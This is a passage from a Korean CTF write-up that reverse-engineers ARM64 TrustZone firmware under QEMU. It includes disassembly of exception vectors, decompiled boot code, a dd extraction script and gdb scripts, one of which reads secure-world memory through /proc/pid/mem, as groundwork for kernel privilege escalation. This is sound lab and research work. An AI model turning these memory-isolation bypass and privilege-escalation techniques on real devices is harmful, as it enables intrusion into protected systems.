d5 msr vbar_el3 ,x0 00000018 df 3f 03 d5 isb 이제 exception vector가 어떻게 생겼는지 알고 있다.\n+#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; 앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다. VIRT_FLASH 부터 적재되었고, phyiscal address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.\nLAB_00002000 XREF[1]: FUN_000b8244:000b8344 (*) 00002000 00 00 80 d2 mov x0,#0x0 00002004 79 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002008 76 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000200c 00 00 00 00 udf 0x0 00002010 00 00 00 db[112] 00 00 00 00 00 00 00002080 20 00 80 d2 mov x0,#0x1 00002084 59 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002088 56 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000208c 00 00 00 00 udf 0x0 00002090 00 00 00 ??[112] 00 00 00 00 00 00 00002100 40 00 80 d2 mov x0,#0x2 00002104 39 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002108 36 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000210c 00 00 00 00 udf 0x0 00002110 00 00 00 ??[112] 00 00 00 00 00 00 00002180 60 00 80 d2 mov x0,#0x3 00002184 19 fb ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002188 16 fb ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000218c 00 00 00 00 udf 0x0 00002190 00 00 00 ??[112] 00 00 00 00 00 00 00002200 80 00 80 d2 mov x0,#0x4 00002204 f9 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002208 f6 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000220c 00 00 00 00 udf 0x0 00002210 00 00 00 ??[112] 00 00 00 00 00 00 00002280 a0 00 80 d2 mov x0,#0x5 00002284 d9 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002288 d6 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000228c 00 00 00 00 udf 0x0 00002290 00 00 00 ??[112] 00 00 00 00 00 00 00002300 c0 00 80 d2 mov x0,#0x6 00002304 b9 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002308 b6 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000230c 00 00 00 00 udf 0x0 00002310 00 00 00 ??[112] 00 00 00 00 00 00 00002380 e0 00 80 d2 mov x0,#0x7 00002384 99 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002388 96 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000238c 00 00 00 00 udf 0x0 00002390 00 00 00 ??[112] 00 00 00 00 00 00 00002400 ff 44 03 d5 msr DAIFClr,#0x4 00002404 fe 7b 00 f9 str x30 ,[sp, #0xf0 ] 00002408 1e 52 3e d5 mrs x30 ,esr_el3 0000240c de 7f 5a d3 ubfx x30 ,x30 ,#0x1a ,#0x6 00002410 df 5f 00 f1 cmp x30 ,#0x17 00002414 61 1f 00 54 b.ne LAB_00002800 00002418 fd 00 00 14 b LAB_0000280c 0000241c 00 00 00 ??[100] 00 00 00 00 00 00 00002480 20 01 80 d2 mov x0,#0x9 00002484 59 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002488 56 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000248c 00 00 00 00 udf 0x0 00002490 00 00 00 ??[112] 00 00 00 00 00 00 00002500 40 01 80 d2 mov x0,#0xa 00002504 39 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002508 36 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000250c 00 00 00 00 udf 0x0 00002510 00 00 00 ??[112] 00 00 00 00 00 00 00002580 60 01 80 d2 mov x0,#0xb 00002584 19 fa ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002588 16 fa ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000258c 00 00 00 00 udf 0x0 00002590 00 00 00 ??[112] 00 00 00 00 00 00 00002600 ff 44 03 d5 msr DAIFClr,#0x4 00002604 fe 7b 00 f9 str x30 ,[sp, #0xf0 ] 00002608 1e 52 3e d5 mrs x30 ,esr_el3 0000260c de 7f 5a d3 ubfx x30 ,x30 ,#0x1a ,#0x6 00002610 df 4f 00 f1 cmp x30 ,#0x13 00002614 61 0f 00 54 b.ne LAB_00002800 00002618 7d 00 00 14 b LAB_0000280c ARRAY_0000261c[52] XREF[0,2]: 000bc070 (*) , 000bc078 (*) 0000261c 00 00 00 ??[100] 00 00 00 00 00 00 00002680 a0 01 80 d2 mov x0,#0xd 00002684 d9 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002688 d6 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000268c 00 00 00 00 udf 0x0 00002690 00 00 00 ??[112] 00 00 00 00 00 00 00002700 c0 01 80 d2 mov x0,#0xe 00002704 b9 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002708 b6 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000270c 00 00 00 00 udf 0x0 00002710 00 00 00 ??[112] 00 00 00 00 00 00 00002780 e0 01 80 d2 mov x0,#0xf 00002784 99 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002788 96 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() 0000278c 00 00 00 00 udf 0x0 00002790 00 00 00 ??[112] 00 00 00 00 00 00 LAB_00002800 XREF[2]: 00002414 (j) , 00002614 (j) 00002800 00 01 80 d2 mov x0,#0x8 00002804 79 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002808 76 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() LAB_0000280c XREF[2]: 00002418 (j) , 00002618 (j) 0000280c c0 f9 ff 97 bl FUN_00000f0c undefined FUN_00000f0c(undefined 00002810 e5 03 1f aa mov x5,xzr 00002814 e6 03 00 91 mov x6,sp 00002818 cc 88 40 f9 ldr x12 ,[x6, #0x110 ] 0000281c bf 40 00 d5 msr PState.SP,#0x0 00002820 9f 01 00 91 mov sp,x12 00002824 10 40 3e d5 mrs x16 ,spsr_el3 00002828 31 40 3e d5 mrs x17 ,elr_el3 0000282c 12 11 3e d5 mrs x18 ,scr_el3 00002830 d0 c4 11 a9 stp x16 ,x17 ,[x6, #0x118 ] 00002834 d2 80 00 f9 str x18 ,[x6, #0x100 ] 00002838 47 02 40 b3 bfxil x7,x18 ,#0x0 ,#0x1 0000283c 06 f8 ff 97 bl FUN_00000854 undefined FUN_00000854() 00002840 da f9 ff 17 b FUN_00000fa8 undefined FUN_00000fa8(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) ARRAY_00002844[12] XREF[3,2]: FUN_0000055c:00000578 (*) , ARRAY_00002844 FUN_0000055c:00000654 (*) , 00001950 (*) , Reset:00000060 (*) , 000000d0 (*) 00002844 00 00 00 ??[112] 00 00 00 00 00 00 ghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다. 대충 어떤식으로 분석을 시도해야하는지 알게 되었다.\n그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다. 일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.\nvoid Reset(void) { ulong uVar1; sctlr_el3 = 0x30c50830; InstructionSynchronizationBarrier(); vbar_el3 = 0x2000; InstructionSynchronizationBarrier(); uVar1 = sctlr_el3; sctlr_el3 = uVar1 | 0x100a; InstructionSynchronizationBarrier(); scr_el3 = 0x238; mdcr_el3 = 0x18000; uVar1 = daif; daif = uVar1 \u0026amp; 0xfffffffffffffeff; cptr_el3 = 0; FUN_00001004(DAT_000000b8,DAT_000000c0); FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8); FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8); FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100); FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8); spsel = 0; FUN_00000514(); FUN_000007f4(); FUN_00000fa8(); return; } 대강 어떤 동작을 하고 있는지 이제 이해할 수 있다.\nvoid FUN_00001004(char *param_1,char *param_2) { undefined8 *puVar1; undefined8 *puVar2; undefined8 *puVar3; puVar2 = (undefined8 *)(param_1 + (long)param_2); if (((ulong)param_1 \u0026amp; 0xf) != 0) { puVar1 = (undefined8 *)(((ulong)param_1 | 0xf) + 1); if ((((ulong)param_1 | 0xf) == 0xffffffffffffffff) || (puVar3 = (undefined8 *)param_1, puVar2 \u0026lt;= puVar1)) goto joined_r0x000010b4; do { param_1 = (char *)((long)puVar3 + 1); *(undefined *)puVar3 = 0; puVar3 = (undefined8 *)param_1; } while ((undefined8 *)param_1 != puVar1); } for (; param_1 \u0026lt; (undefined8 *)((ulong)puVar2 \u0026amp; 0xfffffffffffffff0); param_1 = (char *)((long)param_1 + 0x10)) { *(undefined8 *)param_1 = 0; *(undefined8 *)((long)param_1 + 8) = 0; } joined_r0x000010b4: for (; (undefined8 *)param_1 != puVar2; param_1 = (char *)((long)param_1 + 1)) { *param_1 = 0; } return; } 메모리를 0으로 초기화하는 작업을 수행한다.\nvoid FUN_000010f4(char *param_1,char *param_2,ulong size) { undefined8 uVar1; for (; 0xf \u0026lt; size; size = size - 0x10) { uVar1 = *(undefined8 *)((long)param_2 + 8); *(undefined8 *)param_1 = *(undefined8 *)param_2; *(undefined8 *)((long)param_1 + 8) = uVar1; param_1 = (char *)((long)param_1 + 0x10); param_2 = (char *)((long)param_2 + 0x10); } do { if (size == 0) { return; } *param_1 = *param_2; size = size - 1; param_1 = (char *)((long)param_1 + 1); param_2 = (char *)((long)param_2 + 1); } while (size != 0); return; } 두 번째는 단순히 복사하는 함수다.\n정리하면 다음과 같이 표현할 수 있다.\nmemset(0xE002000, 0, 0x202000) memcpy(0xE000000, 0x002850, 0x68) memcpy(0x40100000, 0x10000, 0x10000) memcpy(0xE400000, 0x20000, 0x90000) memcpy(0x40000000, 0xb0000, 0x10000) EL3 코드는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다. FLASH에서 동작한다.\n0x10000를 확인했더니 다음과 같은 코드가 나왔다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_00010000 () undefined w0:1 \u0026lt;RETURN\u0026gt; FUN_00010000 XREF[4]: Reset:00000070 (*) , Reset:00000074 (*) , Reset:00000094 (*) , 000bc080 (*) 00010000 00 c0 00 10 adr x0,0x11800 00010004 00 c0 1c d5 msr vbar_el2 ,x0 00010008 df 3f 03 d5 isb 0001000c 60 01 00 58 ldr x0,DAT_00010038 00010010 81 01 00 58 ldr x1=\u0026gt;DAT_0000d000 ,PTR_DAT_00010040 = 0000d000 00010014 13 02 00 94 bl FUN_00010860 undefined FUN_00010860() 00010018 bf 40 00 d5 msr PState.SP,#0x0 0001001c 60 01 00 58 ldr x0,DAT_00010048 = 0000000040104040h 00010020 1f 00 00 91 mov sp,x0 00010024 0b 00 00 94 bl FUN_00010050 undefined FUN_00010050() 00010028 e2 00 00 94 bl FUN_000103b0 undefined FUN_000103b0() 0001002c 65 00 00 94 bl FUN_000101c0 undefined FUN_000101c0() 00010030 fa 01 00 94 bl FUN_00010818 undefined FUN_00010818(undefined adr로 상대 주소를 만들어낸다. 이는 EL2의 코드이다. 물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다. 여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.\n0xb0000에서 EL1을 확인할 수 있었다.\nvoid UndefinedFunction_000b0000(void) { ulong uVar1; ttbr0_el1 = 0xb1000; ttbr1_el1 = 0xb4000; tcr_el1 = 0x6080100010; InstructionSynchronizationBarrier(); uVar1 = sctlr_el1; sctlr_el1 = uVar1 | 1; InstructionSynchronizationBarrier(); /* WARNING: Treating indirect jump as call */ (*(code *)\u0026amp;LAB_ffffffffc00b8000)(); return; } 이런식으로 virtual memory system을 활성화하고 점프한다. EL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S.EL1에 해당할 것이다. BL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다. 그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 초기화한다.\nExtracting EL1, S-EL1, EL2 binaries #!/bin/sh dd if=./bios.bin of=EL1.out bs=1024 skip=704 count=64 dd if=./bios.bin of=SEL1.out bs=1024 skip=128 count=576 dd if=./bios.bin of=EL2.out bs=1024 skip=64 count=64 이제 EL1을 분석할 수 있게 되었다.\nvoid Reset(void) { ulong uVar1; ttbr0_el1 = 0x1000; ttbr1_el1 = 0x4000; tcr_el1 = 0x6080100010; InstructionSynchronizationBarrier(); uVar1 = sctlr_el1; sctlr_el1 = uVar1 | 1; InstructionSynchronizationBarrier(); /* WARNING: Treating indirect jump as call */ (*(code *)\u0026amp;LAB_ffffffffc0008000)(); return; } 여러 시스템 레지스터를 세팅하는 것을 확인할 수 있다.\nQWORD_00001000 XREF[4]: FUN_00008434:0000846c (*) , FUN_0000c140:0000c1c4 (*) , FUN_0000c140:0000c1d4 (*) , FUN_0000c5dc:0000c630 (*) 00001000 03 20 00 dq 2003h 00 00 00 00 00 0x1000에는 위와 같은 값이 있다.\nTCR_ELx structure \u0026amp; gdbscript 전에 정리했었던 arm manual에서 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 했었다. 그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 했었다. 이를 기반으로 gdbscript로 파싱하는 스크립트를 작성해서 명령을 추가했다.\nimport gdb class TCR_EL1(gdb.Command): def __init__(self): super(TCR_EL1, self).__init__(\u0026#34;tcr_el1\u0026#34;, gdb.COMMAND_USER) def invoke(self, arg, from_tty): arg = arg.split() if len(arg) == 1: tcr = int(arg[0],16) elif len(arg) == 0: tcr = int(gdb.parse_and_eval(\u0026#39;$TCR_EL1\u0026#39;)) else: print(\u0026#34;usuage: tcr_el1 [value (optional)]\u0026#34;) return T0SZ = tcr \u0026amp;0b111111 T1SZ = tcr \u0026gt;\u0026gt; 16 T1SZ \u0026amp;= 0b111111 TG1 = int((tcr\u0026gt;\u0026gt; 30) \u0026amp; 0b11) granule_bits = {0b01: 14, 0b10: 12, 0b11: 16}[TG1] print(\u0026#34;T0:\u0026#34;,hex(0),\u0026#39;~\u0026#39;,hex(2 ** (64-T0SZ)-1)) print(\u0026#34;T1:\u0026#34;,hex(0x10000000000000000 - 2 ** (64-T1SZ)),\u0026#39;~\u0026#39;,hex(0xffffffffffffffff)) print(\u0026#39;granule_bits:\u0026#39;,granule_bits) TCR_EL1() 이러한 범위로 이용되는 것을 확인했다.\nTTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다. qemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.\naddress-space: memory 0000000000000000-ffffffffffffffff (prio -1, i/o): system 0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1 0000000009000000-0000000009000fff (prio 0, i/o): pl011 0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram address-space: I/O 0000000000000000-000000000000ffff (prio 0, i/o): io address-space: cpu-secure-memory-0 0000000000000000-ffffffffffffffff (prio 0, i/o): secure-memory 0000000000000000-0000000003ffffff (prio 0, romd): hitcon.flash0 0000000000000000-ffffffffffffffff (prio -1, i/o): system 0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1 0000000009000000-0000000009000fff (prio 0, i/o): pl011 0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram 000000000e000000-000000000effffff (prio 0, ram): hitcon.secure-ram address-space: cpu-memory-0 0000000000000000-ffffffffffffffff (prio -1, i/o): system 0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1 0000000009000000-0000000009000fff (prio 0, i/o): pl011 0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram 그런데 메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.\nReading a secure memory \u0026amp; gdbscript 각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽기 힘들다. gdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다. 근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다. 이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다. 전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.\n다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다. 이를 바탕으로 직접 gdbscript를 작성해서 물리 메모리를 확인할 수 있는 명령어 지원을 추가했다.\nimport gdb import re import psutil import struct class CPSR(gdb.Command): def __init__(self): super(CPSR, self).__init__(\u0026#34;cpsr\u0026#34;, gdb.COMMAND_USER) def invoke(self, arg, from_tty): cpsr = (int(gdb.parse_and_eval(\u0026#34;$cpsr\u0026#34;))) mode = cpsr \u0026amp; 0b1111 is_thumb = (cpsr \u0026gt;\u0026gt; 4)\u0026amp;1 IRQ = (cpsr \u0026gt;\u0026gt; 5)\u0026amp;1 FIQ = (cpsr \u0026gt;\u0026gt; 6)\u0026amp;1 cond = (cpsr \u0026gt;\u0026gt; 27)\u0026amp;0b1111 re = \u0026#39;\u0026#39; if 0b0000 == mode: re += \u0026#39;EL0t\u0026#39; # SP_EL0 elif 0b0100 == mode: re += \u0026#39;EL1t\u0026#39; # SP_EL0 elif 0b0101 == mode: re += \u0026#39;EL1h\u0026#39; # SP_EL1 elif 0b1000 == mode: re += \u0026#39;EL2t\u0026#39; # SP_EL0 elif 0b1001 == mode: re += \u0026#39;EL2h\u0026#39; # SP_EL2 elif 0b1100 == mode: re += \u0026#39;EL3t\u0026#39; # SP_EL0 elif 0b1101 == mode: re += \u0026#39;EL3h\u0026#39; # SP_EL3 else: re += \u0026#39;UNK\u0026#39; re += \u0026#39;| \u0026#39; if IRQ: re += \u0026#39;IRQ_MASKED | \u0026#39; elif FIQ: re += \u0026#39;FIQ_MASKED | \u0026#39; if is_thumb: re += \u0026#39;THUMB_MODE | \u0026#39; re += f\u0026#39;COND_{hex(cond)[2:]}\u0026#39; print(re) import gdb class TCR_EL1(gdb.Command): def __init__(self): super(TCR_EL1, self).__init__(\u0026#34;tcr_el1\u0026#34;, gdb.COMMAND_USER) def invoke(self, arg, from_tty): arg = arg.split() if len(arg) == 1: tcr = int(arg[0],16) elif len(arg) == 0: tcr = gdb.parse_and_eval(\u0026#39;$TCR_EL1\u0026#39;) else: print(\u0026#34;usuage: tcr_el1 [value (optional)]\u0026#34;) return T0SZ = tcr \u0026amp;0b111111 T1SZ = tcr \u0026gt;\u0026gt; 16 T1SZ \u0026amp;= 0b111111 T1SZ = int(T1SZ) print(\u0026#34;T0:\u0026#34;,hex(0),\u0026#39;~\u0026#39;,hex(2 ** (64-T0SZ)-1)) print(\u0026#34;T1:\u0026#34;,hex(0x10000000000000000 - 2 ** (64-T1SZ)),\u0026#39;~\u0026#39;,hex(0xffffffffffffffff)) TCR_EL1() class QEMU_SUPPORT(gdb.Command): address_space = { \u0026#39;cpu-memory-0\u0026#39;:{ \u0026#39;system\u0026#39; : { \u0026#39;hitcon.flash1\u0026#39; : {\u0026#39;start\u0026#39; : 0x000000004000000, \u0026#39;end\u0026#39; : 0x000000007ffffff}, \u0026#39;pl011\u0026#39; : {\u0026#39;start\u0026#39; : 0x0000000009000000, \u0026#39;end\u0026#39; : 0x0000000009000fff}, \u0026#39;mach-hitcon.ram\u0026#39; : {\u0026#39;start\u0026#39; : 0x0000000040000000, \u0026#39;end\u0026#39; : 0x0000000ffffffff}, } }, \u0026#39;cpu-secure-memory-0\u0026#39;: { \u0026#39;hitcon.flash0\u0026#39; : {\u0026#39;start\u0026#39; : 0x0000000000000000, \u0026#39;end\u0026#39; : 0x0000000003ffffff}, \u0026#39;system\u0026#39; : { \u0026#39;hitcon.flash1\u0026#39; : {\u0026#39;start\u0026#39; : 0x000000004000000, \u0026#39;end\u0026#39; : 0x000000007ffffff}, \u0026#39;pl011\u0026#39; : {\u0026#39;start\u0026#39; : 0x0000000009000000, \u0026#39;end\u0026#39; : 0x0000000009000fff}, \u0026#39;mach-hitcon.ram\u0026#39; : {\u0026#39;start\u0026#39; : 0x0000000040000000, \u0026#39;end\u0026#39; : 0x0000000ffffffff}, }, \u0026#39;hitcon.secure-ram\u0026#39; : {\u0026#39;start\u0026#39; : 0x000000000e000000, \u0026#39;end\u0026#39; : 0x000000000effffff} } } # monitor info mtree @staticmethod def get_remote_pid(proc_name): pids = [] for process in psutil.process_iter(): if proc_name in process.name(): pids.append(process.pid) if len(pids) != 1: return False return pids[0] def __init__(self): super(QEMU_SUPPORT, self).__init__(\u0026#34;qemu_support\u0026#34;, gdb.COMMAND_USER) pid = self.get_remote_pid(\u0026#39;qemu-system-aarch64\u0026#39;) if pid != False: self.pid = pid def read_memory(self, addr, length): gdb.selected_inferior().read_memory(addr, length).tobytes() def find_region_recursive(self, addr): def find_region_step(obj, key): assert type(obj) == type({}) if \u0026#39;start\u0026#39; in obj and \u0026#39;end\u0026#39; in obj: if addr \u0026gt;= obj[\u0026#39;start\u0026#39;] and addr \u0026lt;= obj[\u0026#39;end\u0026#39;]: return key else: return False else: for i in obj: if find_region_step(obj[i], i) != False: return i return False return (find_region_step(QEMU_SUPPORT.address_space, \u0026#39;\u0026#39;)) def read_phys(self, addr, length): def slow_path(): ret = gdb.execute(f\u0026#34;monitor gpa2hva {addr}\u0026#34;, to_string=True) r = re.search(\u0026#34;is (0x[0-9a-f]+)\u0026#34;, ret) if r: host_va = int(r.group(1),16) with open(f\u0026#39;/proc/{self.pid}/mem\u0026#39;,\u0026#39;rb\u0026#39;) as f: f.seek(host_va) data = f.read(length) return data else: print(\u0026#39;Err read_phys() -\u0026gt; slow_path()\u0026#39;) def fast_path(): gdb.execute(f\u0026#39;monitor xp/{length//8}xg {addr}\u0026#39;) return True reg = self.find_region_recursive(addr) # secure mem or non-secure? if reg == \u0026#39;cpu-secure-memory-0\u0026#39;: return slow_path() elif reg == \u0026#39;cpu-memory-0\u0026#39;: return fast_path() else: print(\u0026#34;Err find_region_recursive()\u0026#34;,reg) return # secure world can access non-secure mem as well as secure mem. def invoke(self, arg, from_tty): arg = arg.split() if len(arg) \u0026gt; 0: if arg[0] == \u0026#39;read_phys\u0026#39;: if len(arg) \u0026gt; 2: if arg[1].startswith(\u0026#39;0x\u0026#39;): addr = int(arg[1],16) else: addr = int(arg[1],10) if arg[2].startswith(\u0026#39;0x\u0026#39;): length = int(arg[2],16) else: length = int(arg[2],10) data = self.read_phys(addr, length*8) if data != True: self.qword_dump(data, addr,length) else: print(\u0026#34;invalid args\u0026#34;) @staticmethod def qword_dump(data, addr, length): for i in range(length): if i%2==0: ad = hex(addr + i*0x8)[2:].rjust(16,\u0026#39;0\u0026#39;) print(f\u0026#39;{ad}\u0026#39;,end=\u0026#39;: \u0026#39;) a = hex(struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, data[8*i:8*i+8])[0])[2:].rjust(16,\u0026#39;0\u0026#39;) print(f\u0026#34;0x{a}\u0026#34;,end = \u0026#39; \u0026#39;) if i%2==1: print() if (length-1)%2==0: print() QEMU_SUPPORT() TCR_EL1() CPSR() 메모리 트리를 직접 확인해서 secure memory를 포함한 맵을 직접 하드코딩했다. 정상적으로 secure memory를 확인할 수 있게 되었다. 이를 이용하면 직접 다른 exception level들이 어떻게 secure memory에 적재되는지 확인할 수 있을 것이다.\nEL1, Non-secure Kernel 유저 애플리케이션을 익스플로잇했으니 이제 커널로의 권한 상승을 해야한다. bata24 gef에선 arm64에 대한 pagewalk가 지원된다. 이런식으로 가상주소 매핑도 얻을 수 있다. VBAR을 확인하면 handler들이 보인다..\nsystem call은 synchronous 하고 lower exception level에서부터 발생한다. void UndefinedFunction_ffffffffc000a400(void) { code *UNRECOVERED_JUMPTABLE; undefined8 uVar1; FUN_ffffffffc00090b0(); uVar1 = ttbr0_el1; spsel = 0; FUN_ffffffffc0008ba8(); FUN_ffffffffc000914c(); /* WARNING: Treating indirect jump as call */ UNRECOVERED_JUMPTABLE = (code *)UndefinedInstructionException(0,0xffffffffc000a834); (*UNRECOVERED_JUMPTABLE)(); return; } FUN_ffffffffc00090b0를 먼저 확인하자.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_ffffffffc00090f8 (undefined param_1 , undef undefined w0:1 \u0026lt;RETURN\u0026gt; undefined w0:1 param_1 undefined w1:1 param_2 undefined w2:1 param_3 undefined w3:1 param_4 undefined w4:1 param_5 undefined w5:1 param_6 undefined w6:1 param_7 undefined w7:1 param_8 undefined8 Stack[0x0]:8 param_9 XREF[1]: ffffffffc00090f8 undefined Stack[0x8]:1 param_10 undefined8 Stack[0x10]:8 param_11 XREF[1]: ffffffffc00090fc undefined8 Stack[0x20]:8 param_12 XREF[1]: ffffffffc0009100 undefined8 Stack[0x30]:8 param_13 XREF[1]: ffffffffc0009104 undefined8 Stack[0x40]:8 param_14 XREF[1]: ffffffffc0009108 undefined8 Stack[0x50]:8 param_15 XREF[1]: ffffffffc000910c undefined8 Stack[0x60]:8 param_16 XREF[1]: ffffffffc0009110 undefined8 Stack[0x70]:8 param_17 XREF[1]: ffffffffc0009114 undefined8 Stack[0x80]:8 param_18 XREF[1]: ffffffffc0009118 undefined8 Stack[0x90]:8 param_19 XREF[1]: ffffffffc000911c undefined8 Stack[0xa0]:8 param_20 XREF[1]: ffffffffc0009120 undefined8 Stack[0xb0]:8 param_21 XREF[1]: ffffffffc0009124 undefined8 Stack[0xc0]:8 param_22 XREF[1]: ffffffffc0009128 undefined8 Stack[0xd0]:8 param_23 XREF[1]: ffffffffc000912c undefined8 Stack[0xe0]:8 param_24 XREF[1]: ffffffffc0009138 undefined8 Stack[0xf8]:8 param_25 XREF[1]: ffffffffc0009130 FUN_ffffffffc00090f8 XREF[1]: FUN_ffffffffc000914c:ffffffffc00 fffc00090f8 e0 07 40 a9 ldp param_1 ,param_2 ,[sp]=\u0026gt;param_9 fffc00090fc e2 0f 41 a9 ldp param_3 ,param_4 ,[sp, #param_11 ] fffc0009100 e4 17 42 a9 ldp param_5 ,param_6 ,[sp, #param_12 ] fffc0009104 e6 1f 43 a9 ldp param_7 ,param_8 ,[sp, #param_13 ] fffc0009108 e8 27 44 a9 ldp x8,x9,[sp, #param_14 ] fffc000910c ea 2f 45 a9 ldp x10 ,x11 ,[sp, #param_15 ] fffc0009110 ec 37 46 a9 ldp x12 ,x13 ,[sp, #param_16 ] fffc0009114 ee 3f 47 a9 ldp x14 ,x15 ,[sp, #param_17 ] fffc0009118 f0 47 48 a9 ldp x16 ,x17 ,[sp, #param_18 ] fffc000911c f2 4f 49 a9 ldp x18 ,x19 ,[sp, #param_19 ] fffc0009120 f4 57 4a a9 ldp x20 ,x21 ,[sp, #param_20 ] fffc0009124 f6 5f 4b a9 ldp x22 ,x23 ,[sp, #param_21 ] fffc0009128 f8 67 4c a9 ldp x24 ,x25 ,[sp, #param_22 ] fffc000912c fa 6f 4d a9 ldp x26 ,x27 ,[sp, #param_23 ] fffc0009130 fc 7f 40 f9 ldr x28 ,[sp, #param_25 ] fffc0009134 1c 41 18 d5 msr sp_el0 ,x28 fffc0009138 fc 77 4e a9 ldp x28 ,x29 ,[sp, #param_24 ] fffc000913c c0 03 5f d6 ret +0x40에 x8이 있는 것을 기억하고 있자. FUN_ffffffffc0008ba8가 메인 부분이다.\nvoid FUN_ffffffffc0008ba8(long param_1) { ulong uVar1; bool bVar2; int iVar3; ulong uVar4; long lVar5; undefined8 uVar6; undefined *puVar7; undefined *puVar8; undefined *puVar9; undefined *puVar10; ulong uVar11; uVar11 = esr_el1; if (((uint)(uVar11 \u0026gt;\u0026gt; 26) \u0026amp; 0x3f) != 0b00010101) { /* WARNING: Subroutine does not return */ FUN_ffffffffc00091b0(); } uVar11 = *(ulong *)param_1; puVar10 = *(undefined **)(param_1 + 8); puVar9 = *(undefined **)(param_1 + 0x10); uVar4 = *(ulong *)(param_1 + 0x40); puVar7 = puVar9; if (uVar4 == 0x3f) { if (puVar9 != (undefined *)0x0) { iVar3 = FUN_ffffffffc0009ad8(); if (iVar3 \u0026lt; 0) { puVar7 = (undefined *)0xffffffffffffffff; } else { *puVar10 = (char)iVar3; puVar7 = (undefined *)0x1; } } } ... EC field에 대해 접근하고 있다. 딱 봐도 이 함수는 위 두 값에 대한 비교를 하는 함수인 것을 알 수 있다.\n... } } else { usr = (undefined *)0xffffffffffffffff; } } else if ((x8 \u0026amp; 0xff000000) == 0xff000000) { usr = (undefined *)FUN_ffffffffc0008a34(x8,x0,x1,x2); } else { usr = (undefined *)0xffffffffffffffff; } } } } *(undefined **)param_1 = usr; return; } 그리고 0xff로 마스킹되어서 처리하는 부분이 있는데, 여긴 secure world 